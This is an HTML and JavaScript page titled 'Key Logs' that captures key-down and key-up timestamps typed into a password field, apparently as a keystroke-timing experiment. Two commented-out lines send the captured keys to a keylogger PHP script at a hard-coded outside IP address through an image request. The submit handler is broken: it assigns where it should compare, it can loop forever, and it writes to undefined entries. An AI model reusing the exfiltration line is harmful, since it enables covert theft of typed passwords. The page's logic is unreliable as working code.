<!DOCTYPE html>
<html>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
</head>
<body>

	<h1>Key Logs</h1>

	<input type="password" id = "text">&nbsp &nbsp &nbsp &nbsp &nbsp <button type = "submit" id = "submit">Submit</button>
	<p id="demo"></p>

<script>

var buffer = [], final = [];
var oldstroke = new Object();
var newstroke = new Object();

document.getElementById("text").onkeydown = function(e) {
	//var keys='';
	//get = window.event?event:e;
	//key = get.keyCode?get.keyCode:get.charCode;
	//key = String.fromCharCode(key);
	//keys+=key;
	//alert("function");

	var timestamp = Date.now() | 0;
    var stroke = {
        key: e.key,
        time: timestamp

    };
    //var data = encodeURIComponent(JSON.stringify(buffer));
    if(stroke["key"] == "Backspace")
    {
    	buffer = [];
    	document.getElementById("text").value = "";
    }

    else if(stroke["key"] != "Shift"){
    	/*if(stroke["key"] != newstroke.key){
    		var newdown = stroke;
    		var olddown = newtsroke;
    		var time = olddown.time - newdown.time;

    		oldstroke.time = newstroke.time - ;

    	}*/
    	buffer.push(stroke);
    }

	window.setInterval(function(){
	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
	}, 1000);
}


document.getElementById("text").onkeyup = function(e) {
	//var keys='';
	//get = window.event?event:e;
	//key = get.keyCode?get.keyCode:get.charCode;
	//key = String.fromCharCode(key);
	//keys+=key;
	//alert("function");
	var timestamp = Date.now() | 0;
    var stroke = {
        key: e.key,
        time: timestamp
    };

    //var data = encodeURIComponent(JSON.stringify(buffer));

    if(stroke["key"] == "Backspace")
    {
    	buffer = [];
    	document.getElementById("text").value = "";
    }
    else if(stroke["key"] != "Shift")
    {
    	buffer.push(stroke);
    }

	window.setInterval(function(){
	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
	}, 1000);
}

document.getElementById("submit").onclick = function(e){
    var down = new Object();
    var up = new Object();
    var c = 0,i = 0,k = 0;
    for(j = 0 ; j<buffer.length ; j++){
        i = j+1;
        c = 0;
        down = buffer.shift();
        while(c!= 1){
            if(buffer[i].key = down.key){
                var temp = buffer.splice(i,1);
                up = temp[0];
                c = 1;
            }
        }

        final[k].key = down.key;
        final[k].keyDownTime = down.time;
        final[k].keyUpTime = up.time;
        console.log(final[k] + "\n");
        k++;
        /*if(j! = 0){
            if(final[j].keyDownTime >= final[j-1].keyUpTime){
                final[j].flightTime = 0;
                final[j-1].keyPressTime = final[j-1].keyDownTime - finla[j].keyDownTime;
            }

            else
                final[j]
        }*/
    }
}

</script>
</body>
</html>